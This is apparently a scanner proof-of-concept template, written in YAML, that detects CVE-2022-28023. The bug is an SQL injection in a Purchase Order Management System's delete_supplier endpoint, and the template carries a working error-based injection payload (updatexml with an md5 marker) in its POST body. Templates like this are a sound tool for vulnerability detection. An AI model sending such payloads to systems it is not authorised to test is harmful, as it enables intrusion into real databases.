name: yaml-poc-purchase_order_management_system_project-purchase_order_management_system-sql_injection-CVE-2022-28023
binding: 6599866f-0051-413a-a400-f1c15085a8c2
detail:
    author: jiapeng.han
    links:
        - https://cxsecurity.com/cveshow/CVE-2022-28023/
        - https://github.com/k0xx11/bug_report/blob/main/vendors/oretnom23/purchase-order-management-system/SQLi-2.md
    vulnerability:
        id: 5b46f860-bc9a-4e3a-92b5-49d30e8cdd58
        level: critical
    warning: Harmless
transport: http
set:
    s1: randomInt(10000000, 99999999)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /classes/Master.php?f=delete_supplier
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: id=1' and updatexml(1,concat(0x7e,(select md5({{s1}})),0x7e),0)--+
            follow_redirects: false
        expression: response.status == 200 && response.body_string.contains(substr(md5(string(s1)), 2, 28))
expression: r0()
